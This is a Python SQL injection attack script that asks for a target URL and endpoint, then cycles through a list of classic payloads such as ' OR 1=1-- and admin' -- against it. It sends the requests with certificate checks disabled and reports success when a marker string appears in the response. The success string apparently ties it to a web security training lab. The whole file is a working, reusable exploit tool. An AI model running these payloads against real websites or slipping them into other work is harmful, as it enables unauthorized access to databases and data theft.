import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def log_to_file(message, log_file):
    """Simple logging function to write messages to a file."""
    try:
        with open(log_file, 'a') as f:
            f.write(f"{message}\n")
    except IOError as e:
        print(f"[-] Warning: Could not write to log file: {e}")

def exploit_sqli(log_file):
    """Function to exploit SQL injection by trying multiple payloads with user-provided URL and URI."""
    # Prompt user for the URL
    url = input("(+) Enter the target URL (e.g., https://www.example.com): ").strip()
    if not url:
        log_to_file("[-] No URL provided. Exiting function.", log_file)
        print("[-] No URL provided.")
        return

    # Prompt user for the URI (endpoint)
    uri = input("(+) Enter the SQL injection endpoint (e.g., /filter?category=): ").strip()
    if not uri:
        log_to_file("[-] No URI provided. Exiting function.", log_file)
        print("[-] No URI provided.")
        return

    payloads = [
        "1=1",
        "\" OR \"1\"=\"1",
        "admin' --",
        "' OR ''='",
        "' OR 1=1#",
        "'+OR+1=1--",
        "\" OR 1=1#",
        "' or 1=1--",
        "' OR '1'='1",
        "'+OR+1=1--",
    ]

    for payload in payloads:
        full_url = url + uri + payload
        log_to_file(f"[*] Trying SQL injection payload: {payload}", log_file)
        try:
            r = requests.get(full_url, verify=False, timeout=5)
            log_to_file(f"[*] Request sent to: {full_url}", log_file)
            log_to_file(f"[*] Response status code: {r.status_code}", log_file)
            
            if "Cat Grin" in r.text:  # Customize success indicator as needed
                log_to_file(f"[+] SQL injection successful with payload: {payload}", log_file)
                print(f"(+) SQL injection successful with payload: {payload}")
                return
        except requests.exceptions.RequestException as e:
            log_to_file(f"[-] Error occurred while testing payload: {e}", log_file)
    
    log_to_file("[-] SQL injection unsuccessful with all payloads.", log_file)
    print("[-] SQL injection unsuccessful with all payloads.")

# Example usage for standalone testing
if __name__ == "__main__":
    test_log_file = "sqli_log.txt"
    exploit_sqli(test_log_file)